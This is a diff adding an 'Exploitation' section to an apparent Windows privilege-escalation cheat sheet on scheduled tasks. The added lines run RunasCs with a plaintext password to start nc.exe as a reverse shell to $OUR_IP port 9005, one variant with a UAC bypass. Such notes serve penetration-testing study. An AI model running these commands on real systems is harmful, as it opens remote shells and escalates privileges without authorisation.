@@ -93,6 +93,14 @@ schtasks /query /fo LIST /v /TN "$TASK"
 cat tasks.txt | grep \.exe | grep -iv system32
 ```
 
+### Exploitation
+
+```powershell
+# RunasCs
+.\RunasCs.exe mojo "Password123!" "C:\ProgramData\System\nc.exe $OUR_IP 9005 -e cmd.exe" -t 0
+.\RunasCs.exe mojo "Password123!" "C:\ProgramData\System\nc.exe $OUR_IP 9005 -e cmd.exe" -t 0 --bypass-uac --logon-type 8
+```
+
 ## Automated Tools
 
 **Primary:**
